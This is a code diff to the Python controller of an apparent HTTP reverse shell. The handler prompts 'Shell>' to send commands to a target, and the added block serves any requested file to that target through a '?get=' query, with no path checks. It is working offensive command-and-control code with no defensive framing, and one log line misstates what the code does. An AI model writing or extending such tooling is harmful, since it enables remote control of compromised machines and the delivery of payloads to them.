@@ -24,6 +24,21 @@ class MyHandler(BaseHTTPRequestHandler):
 
     # Send command to client (on Target)
     def do_GET(self):
+       if self.path.find('?get')>=0:
+        try:
+         path=urlparse(self.path).query.split('=')[1]
+         self.send_response(HTTP_STATUS_OK)
+         self.send_header("Content-type", "text/html")
+         self.end_headers()    
+         with open('{}'.format(path),'rb') as output_file:
+          self.wfile.write(output_file.read())
+         print('Send Files as {}'.format(path))
+         print("File saved as D:\\tmp\\tempfile")    
+        except Exception as e:
+         print(e)   
+        finally:
+         return   
+       else: 
         command = input("Shell> ")
         self.send_response(HTTP_STATUS_OK)
         self.send_header("Content-type", "text/html")
